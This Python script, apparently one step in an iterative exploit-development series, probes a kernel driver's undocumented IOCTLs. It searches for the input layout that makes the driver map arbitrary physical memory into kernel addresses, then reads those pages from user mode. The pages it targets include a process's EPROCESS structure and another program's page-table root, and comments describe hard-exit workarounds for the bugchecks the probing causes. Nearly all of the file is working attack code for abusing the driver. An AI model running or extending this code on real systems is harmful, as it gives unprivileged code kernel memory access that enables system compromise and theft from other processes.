r"""p84_ioctl_shapes.py -- find the accepted struct for MAP_K / TRANSLATE / ALLOC.

err=1 from the 0xC35028xx family is ERROR_INVALID_FUNCTION, which is how a
driver reports STATUS_INVALID_DEVICE_REQUEST -- i.e. the input buffer length
did not match the one the handler accepts.  p76 read that as "unimplemented"
and only ever sent 4 or 8 bytes, so the family was never actually tried in a
shape the driver could accept.

MAP_K is the one that matters: it takes the same in-struct as read, and read
proves the layout {u64 pa, u32 size, u32 pad, u64 dst} by working.  p76 passed
dst=0 and got 1450 on a good page, so dst is probably mandatory.  This tries a
real mapped destination and, in parallel, walks a few plausible lengths for the
other two calls.  First qword of the map result is compared to the control
page's own content, so an OK is checked, not trusted.

Read-only (no unmap of anything we did not map, no writes to the device).

Usage: python temp\p84_ioctl_shapes.py [CTL [BAD]]
  CTL = live page that reads (positive control, e.g. temp\_p85_targets.txt CTL)
  BAD = page that refuses (negative control).  Both are taken as argv because
  a reboot recycles them: 0x6d98a1000 / 0x6f04bf000 belonged to pid 18592 and
  it died in the 08:31 bugcheck.  The old constants stay as the fallback so an
  accidental bare run still produces the old comparison instead of a crash.
"""
import ctypes
import os
os.environ.setdefault("GIO_DST_LAST", "1")   # p93: close handle before freeing dst
import struct
import sys
import time

HERE = os.path.dirname(os.path.abspath(__file__))
ROOT = os.path.dirname(HERE)
sys.path.insert(0, os.path.join(ROOT, "ext"))
import gio  # noqa: E402

OUT = os.path.join(HERE, "_p97_shapes.txt")
CTL = 0x6D98A1000           # live EPROCESS page, reads (pid 18592, pre-08:31)
BAD = 0x6F04BF000           # live Code.exe PML4 frame, refuses (same)


def main():
    global CTL, BAD
    if len(sys.argv) > 1:
        CTL = int(sys.argv[1], 0)
    if len(sys.argv) > 2:
        BAD = int(sys.argv[2], 0)
    lines = []
    f = open(OUT, "w", encoding="utf-8")

    def log(s):
        lines.append(s)
        f.write(s + "\n")
        f.flush()
        os.fsync(f.fileno())     # p90: bytes must land before the teardown crash

    log("p97 start  %s" % time.strftime("%H:%M:%S"))
    log("targets CTL=%#x BAD=%#x" % (CTL, BAD))
    try:
        _body(log)
    except Exception as e:                                    # noqa: BLE001
        import traceback
        log("FATAL %s: %s" % (type(e).__name__, e))
        log(traceback.format_exc())
    f.close()
    return 0


def _body(log):
    g = gio.Gio()
    try:
        log("mapK in-struct variants, control page %#x" % CTL)
        if not g.is_ram(CTL):
            log("CTL %#x is not RAM -> abort" % CTL)
            return
        want = g.read_phys_checked(CTL, 8)
        log("control head %s" % want.hex())
        dstbuf = (ctypes.c_ubyte * 0x1000)()
        dst = ctypes.addressof(dstbuf)
        # locked, because the driver copies into it without a probe (p76 fault
        # path: an unlocked page can be paged out mid-copy)
        log("dst user va %#x locked=%d" % (dst, gio.kernel32.VirtualLock(dst, 0x1000)))
        best = ""
        for name, ib in (("QIIQ dst", struct.pack("<QIIQ", CTL, 0x1000, 0, dst)),
                         ("QIIQ dst=0", struct.pack("<QIIQ", CTL, 0x1000, 0, 0)),
                         ("QQQ", struct.pack("<QQQ", CTL, 0x1000, dst)),
                         ("QIIQ sz=0", struct.pack("<QIIQ", CTL, 0, 0, dst))):
            ok, err, ob, got = g._ioctl(gio.IOCTL_MAP_K, ib, 0x1000)
            if not ok:
                log("  %-12s ok=0 err=%d" % (name, err))
                continue
            kva = struct.unpack_from("<Q", ob)[0] if len(ob) >= 8 else 0
            body = ""
            if kva:
                try:
                    got8 = ctypes.string_at(kva, 8)
                    body = " head=%s %s" % (got8.hex(),
                                            "MATCH" if got8 == want else "differs")
                    if got8 == want and not best:
                        best = name
                except OSError:
                    body = " unreadable"
            log("  %-12s ok=1 got=%d kva=%#x%s" % (name, got, kva, body))

        log("mapK on bad frame %#x with dst" % BAD)
        ib = struct.pack("<QIIQ", BAD, 0x1000, 0, dst)
        ok, err, ob, got = g._ioctl(gio.IOCTL_MAP_K, ib, 0x1000)
        log("  bad ok=%d err=%d got=%d" % (1 if ok else 0, err if not ok else 0, got))
        res = "ctl=%#x bad=%#x accepted=%d" % (CTL, BAD, 1 if ok else 0)
        log("RESULT mk_accepted_bad=%d" % (1 if ok else 0))

        log("TRANSLATE length sweep, va=buffer")
        for n in (8, 12, 16, 4):
            ib = struct.pack("<Q", dst)[:n].ljust(n, b"\0")
            ok, err, ob, got = g._ioctl(gio.IOCTL_TRANSLATE, ib, 0x10)
            log("  len=%-2d ok=%d err=%d got=%d out=%s"
                % (n, 1 if ok else 0, err if not ok else 0, got, ob[:8].hex()))

        log("ALLOC length sweep")
        for label, ib in (("u32", struct.pack("<I", 0x1000)),
                          ("u64", struct.pack("<Q", 0x1000)),
                          ("u32,u32", struct.pack("<II", 0x1000, 0)),
                          ("u32,u32,u32", struct.pack("<III", 0x1000, 0, 0)),
                          ("u64,u32,u32,u64", struct.pack("<QIIQ", 0x1000, 0, 0, 0))):
            ok, err, ob, got = g._ioctl(gio.IOCTL_ALLOC, ib, 0x10)
            log("  %-16s ok=%d err=%d got=%d out=%s"
                % (label, 1 if ok else 0, err if not ok else 0, got,
                   ob[:16].hex()))
        log("VERDICT: MK_%s  %s" % ("ACCEPTED " + best if best else "NO_MATCH",
                                    res))
    finally:
        g.close()
        log("closed")


if __name__ == "__main__":
    rc = main()
    # p90: same hard exit as p85 -- the bugcheck fires in CPython finalisation /
    # gdrv3 unload after our own close(), so never let finalisation run.
    sys.stdout.flush()
    sys.stderr.flush()
    os._exit(rc)

